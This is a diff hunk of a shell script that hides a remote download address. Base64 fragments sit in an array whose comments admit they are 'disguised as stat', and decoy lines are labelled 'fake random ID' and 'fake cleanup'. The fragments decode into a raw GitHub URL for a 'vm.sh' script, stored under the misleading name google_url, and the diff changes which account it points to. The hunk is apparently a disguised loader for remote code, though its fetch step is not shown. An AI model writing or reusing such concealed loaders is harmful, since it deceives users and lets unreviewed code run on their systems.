@@ -64,9 +64,9 @@ echo -n "Validating process integrity..." > /dev/null
 DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4) # Fake random ID
 PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')" # src6 disguised as stat
 export FAKE_PID="pid_$((RANDOM % 1000))" # Fake process ID
-PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2Fu' | head -c 16)" # src7 disguised as stat
+PROC_STAT[2]="$(echo 'bnRlbnQuY29tL3Bh' | head -c 16)" # src7 disguised as stat
 if [ -f /tmp/fake_temp ]; then rm -f /tmp/fake_temp 2>/dev/null; fi # Fake cleanup
-PROC_STAT[3]="$(echo 'ZHJ5Z2liaHEwMC92cHMxMjMvbWFpbi92bS5zaA==' | grep -o '.*')" # src8 disguised as stat
+PROC_STAT[3]="$(echo 'c2tvZmExMC92cHMxMjMvbWFpbi92bS5zaA==' | grep -o '.*')" # src8 disguised as stat
 # let's go to up-to-date
 google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"
 
